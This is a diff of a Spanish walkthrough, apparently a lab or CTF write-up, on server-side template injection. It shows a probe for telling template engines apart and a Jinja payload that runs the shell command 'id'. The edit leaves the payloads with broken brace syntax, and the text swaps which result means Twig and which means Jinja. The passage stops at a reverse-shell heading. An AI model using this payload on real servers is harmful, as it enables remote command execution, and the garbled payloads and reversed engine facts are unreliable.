@@ -106,7 +106,7 @@ La página de configuración tiene un campo de entrada para el nombre de usuario
 
 ## Identificación del motor de plantillas
 
-Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, podemos verificar con la carga útil `{% raw %}{% raw %}{{7*'7'}}{% endraw %}{% endraw %}`:
+Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, podemos verificar con la carga útil ` {7*'7'} `:
 
 - Si devuelve el resultado 49, eso significa que está usando Twig
 - Si devuelve 7777777, entonces está usando Jinja
@@ -114,7 +114,7 @@ Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, 
 Es Jinja. Ahora necesitamos buscar la carga útil para ejecutar el comando:
 
 ```python
-{% raw %}{% raw %}{% raw %}{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}{% endraw %}{% endraw %}{% endraw %}
+ { self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() } 
 ```
 
 ## Obtención de shell reverso
